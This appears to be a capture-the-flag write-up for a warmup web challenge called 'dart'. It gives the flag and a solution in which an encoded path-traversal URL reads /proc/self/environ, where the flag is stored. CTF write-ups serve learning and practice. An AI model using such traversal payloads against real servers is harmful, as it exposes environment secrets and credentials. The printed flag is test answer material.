# Description
Good morning everyone (GMT+8), let's do some warmup!

Check out dart.wgmy @ 13.76.138.239

P.S. It is the same file as `Secret 2`.

# Flag
wgmy{1ab97a2708d6190bf882c1acc283984a}


# Analysis
Reading through the files you will find that the flag is stored within /proc/self/environ so now we have to find out how to access it.

# Solution
After inspecting the code for hours I noticed there aren't any restrictions preventing access to the endpoint so we can probably access it using path traversal the one that worked for me was:
`http://dart.wgmy/..%2f..%2fproc/self/environ`

![image](https://github.com/user-attachments/assets/f878b0be-46cc-4532-b8ce-9a4f19c804aa)

